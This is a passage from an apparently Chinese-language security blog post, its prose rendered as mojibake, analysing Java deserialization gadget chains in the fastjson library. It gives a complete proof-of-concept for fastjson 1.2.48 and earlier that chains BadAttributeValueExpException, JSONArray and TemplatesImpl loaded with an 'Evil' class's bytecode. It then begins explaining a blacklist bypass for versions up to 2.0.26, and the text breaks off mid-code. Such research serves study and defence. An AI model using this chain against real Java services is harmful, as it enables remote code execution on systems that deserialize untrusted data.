                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><blockquote>
<p>åˆ†ä¸º2ä¸ªç‰ˆæœ¬æ¥æ¢ç©¶</p>
</blockquote>
<p>è¿™é‡Œæˆ‘ä»¬æ‰¾çš„æ˜¯åŸç”Ÿé“¾ï¼ŒåŠfastjsonä¾èµ–ä¸‹çœ‹çœ‹å¯ååºåˆ—åŒ–çš„ç±»ï¼Œçœ‹æœ‰å“ªäº›å¯ä»¥ç”¨ï¼Œè¿™é‡ŒæŸ¥æ‰¾åªæœ‰è¿™ä¸‰ä¸ª,1.2.49ä¹‹åæ²¡è¿™ä¸ª<code>AntiCollisionHashMap</code>äº†</p>
<p><img loading="lazy" src="images/image-20250228095306065.png" alt="image-20250228095306065"  />
</p>
<p><strong>ç¯å¢ƒ</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;groupId&gt;</span>org.javassist<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;artifactId&gt;</span>javassist<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;version&gt;</span>3.19.0-GA<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;groupId&gt;</span>com.alibaba<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;artifactId&gt;</span>fastjson<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;version&gt;</span>1.2.48<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></div><h1 id="1248">1.2.48&lt;=<a hidden class="anchor" aria-hidden="true" href="#1248">#</a></h1>
<h2 id="0x01-åˆ†æ">0x01 åˆ†æ<a hidden class="anchor" aria-hidden="true" href="#0x01-åˆ†æ">#</a></h2>
<p>å·²çŸ¥æ¡ä»¶æœ‰<code>JSON.toString</code>-&gt;<code>JSON.toJSONString</code>è§¦å‘<code>getteræ–¹æ³•</code></p>
<p>è¿™é‡Œæˆ‘ä»¬å°±æ˜¯è¦åˆ†ææ€ä¹ˆè§¦å‘çš„getteræ–¹æ³•</p>
<p>è·Ÿè¿›è¿™é‡Œ<code>write()</code></p>
<p><img loading="lazy" src="images/image-20250303091732213.png" alt="image-20250303091732213"  />
</p>
<p>åœ¨ä¸‹é¢è¿™ä¸ª<code>write()</code>ä¸­ï¼Œä¼šè§¦å‘æˆ‘ä»¬çš„getterï¼Œä½†æ˜¯<code>itemSerializer</code>æ˜¯ä¸€ä¸ªæ ¹æ®æˆ‘ä»¬ä¼ å…¥çš„ç±»ï¼Œ<code>åŠ¨æ€ç”Ÿæˆçš„ä¸€ä¸ªObjectSerializerå¯¹è±¡</code></p>
<p><img loading="lazy" src="images/image-20250303091827916.png" alt="image-20250303091827916"  />
</p>
<p>åˆ™æˆ‘ä»¬è·Ÿè¿›<code>serializer.getObjectWriter</code>çœ‹çœ‹æ€ä¹ˆåˆ›é€ çš„</p>
<p>åœ¨<code>ASMSerializerFactory#createJavaBeanSerializer</code>ä¸­ä¼šå¯¹è¿™ä¸ª<code>Classè¿›è¡Œåˆ›é€ </code>ï¼Œå¹¶<code>å®ä¾‹åŒ–ç”Ÿæˆå¯¹è±¡</code>è¿”å›</p>
<p><img loading="lazy" src="images/image-20250303092226028.png" alt="image-20250303092226028"  />
</p>
<p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥è·å–æœ€ç»ˆçš„<code>byte[]</code>è¿˜åŸè¿™ä¸ªclass</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SaveClassFile</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">saveClassFile</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">className</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// å®šä¹‰æ–‡ä»¶è·¯å¾„å’Œåç§°</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">fileName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">className</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;.class&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">(</span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="n">fileName</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// å°†å­—èŠ‚æ•°ç»„å†™å…¥æ–‡ä»¶</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">fos</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">code</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Class file saved: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">fileName</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ç¤ºä¾‹ï¼šå‡è®¾ä½ å·²ç»æœ‰ä¸€ä¸ª byte[] code</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">base64</span><span class="o">=</span><span class="s">&#34;yv66vgAAADEA5gEAPWNvb...&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">getDecoder</span><span class="p">().</span><span class="na">decode</span><span class="p">(</span><span class="n">base64</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">className</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;ser&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">saveClassFile</span><span class="p">(</span><span class="n">className</span><span class="p">,</span><span class="w"> </span><span class="n">code</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>è¿˜åŸå‡ºæ¥å¼ ä¸‹é¢è¿™ä¸ªæ ·å­ï¼Œå…¶<code>writeæ–¹æ³•</code>ä¸­ï¼Œç»è¿‡ä¸å®Œæ•´è°ƒè¯•ä¼š<code>è¿›å…¥else</code>è°ƒç”¨ä¸‹é¢çš„<code>getOutputProperties()</code></p>
<p><img loading="lazy" src="images/image-20250303092703657.png" alt="image-20250303092703657"  />
</p>
<p>ç„¶åå…³äº<code>FieldInfo</code>çš„å€¼çš„è·å–ï¼Œè¿™ä¸ªå…³ç³»åˆ°ä¼šè°ƒç”¨å“ªäº›getterï¼Œè¿™é‡Œç®€å•æä¸€å˜´å§</p>
<p><code>computeGetters()</code>æ–¹æ³•é‡Œï¼Œä¼šå¯¹è¯¥ç±»çš„æ‰€æœ‰æ–¹æ³•è¿›è¡Œå¤„ç†ï¼Œå¹¶æå–<code>get</code>å’Œ<code>is</code>å¼€å¤´çš„æ–¹æ³•</p>
<p><img loading="lazy" src="images/image-20250303093455345.png" alt="image-20250303093455345"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">methodName</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&#34;get&#34;</span><span class="p">)){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">if</span><span class="p">(</span><span class="n">methodName</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&#34;is&#34;</span><span class="p">)){</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶åè¿™äº›æå–çš„<code>FieldInfo</code>åˆ™å­˜å‚¨åœ¨fieldsä¸­äº†</p>
<p>ç„¶åæ•´æ¡é“¾å­å°±æ²¡ä»€ä¹ˆéš¾åº¦äº†ï¼Œé€šè¿‡<code>BadAttributeValueExpException</code>è§¦å‘<code>toString</code>å°±è¡Œ</p>
<h2 id="0x02-poc">0x02 poc<a hidden class="anchor" aria-hidden="true" href="#0x02-poc">#</a></h2>
<blockquote>
<p><code>getterè°ƒç”¨</code>æ˜¯é€šè¿‡è§¦å‘<code>JSON#toString</code>å®ç°çš„ï¼Œ<code>JSON</code>è¿™é‡Œæ˜¯æŠ½è±¡ç±»ï¼Œç„¶åä»–æœ‰ä¸¤ä¸ªç»§æ‰¿ç±»JSONArrayï¼ŒJSONArray</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;sd&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">JSONObject</span><span class="w"> </span><span class="n">objects</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JSONObject</span><span class="p">(</span><span class="n">map</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONArray</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.NotFoundException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Learn</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">Evil</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">code</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="s">&#34;111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONArray</span><span class="w"> </span><span class="n">objects</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JSONArray</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">objects</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;javax.management.BadAttributeValueExpException&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">o</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">o</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">11</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;val&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">val</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">val</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">o1</span><span class="p">,</span><span class="w"> </span><span class="n">objects</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">o1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFiled</span><span class="p">(</span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">number</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">declaredField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="n">number</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h1 id="1249--2026">1.2.49&ndash;&gt;2.0.26<a hidden class="anchor" aria-hidden="true" href="#1249--2026">#</a></h1>
<p>1.2.49ä¹‹åï¼Œ<code>JSONObject</code>æ–°å¢äº†<code>SecureObjectInputStream</code>æ¥å¤„ç†<code>JSONObject</code>å’Œ<code>JSONArray</code>çš„<code>readObject()ååºåˆ—åŒ–</code>ï¼Œå…¶ä¸­å¢åŠ äº†<code>resolveClass</code>å’Œ<code>resolveProxyClass</code>ä¼šå¯¹ç›¸å…³çš„<code>æ™®é€šç±»</code>ä»¥åŠ<code>ä»£ç†ç±»çš„æ¥å£ç±»</code>è¿›è¡Œ<code>æ£€æµ‹</code></p>
<p><img loading="lazy" src="images/image-20250303173414146.png" alt="image-20250303173414146"  />
</p>
<p>è¿™é‡Œ<code>é»‘åå•</code>æ£€æµ‹å‡º<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p>
<p><img loading="lazy" src="images/image-20250303095920446.png" alt="image-20250303095920446"  />
</p>
<p>è¿™é‡Œåˆ©ç”¨æ€è·¯ï¼Œæ˜¯å› ä¸º<code>SecureObjectInputStream</code>åªä¼šå¤„ç†<code>JSON2</code>ç›¸å…³çš„ååºåˆ—åŒ–(è¿™é‡ŒJSON2ä»£è¡¨<code>JSONObject</code>å’Œ<code>JSONArray</code>ï¼Œåé¢éƒ½è¿™æ ·è¡¨ç¤ºæ‡’å¾—å†™äº†)ï¼Œè¿™è®©æˆ‘ä»¬æœ‰äº†æ“ä½œçš„ç©ºé—´</p>
<p>ä»€ä¹ˆæ„æ€å‘¢ï¼Œè¿™é‡Œå†™äº†ä¸€ä¸ªå°demoä¾›å¤§å®¶ç†è§£ï¼Œè¿™é‡Œ<code>TemplatesImpl</code>å’Œ<code>JdbcRowSetImpl</code>éƒ½æ˜¯é»‘åå•çš„ï¼Œè€Œè¿™é‡Œåªæœ‰addåˆ°JSONArrayçš„<code>JdbcRowSetImpl</code>ä¼šè¢«<code>SecureObjectInputStream</code>å¤„ç†ï¼Œè€Œ<code>TemplatesImpl</code>åˆ™æ˜¯æ­£å¸¸çš„<code>ObjectInputStream</code>çš„å¤„ç†ï¼Œåˆ™ä¸ä¼šè¢«æ£€æµ‹ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONArray</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.rowset.JdbcRowSetImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Templates</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.TransformerConfigurationException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.URL</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.ArrayList</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Properties</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test_ser</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
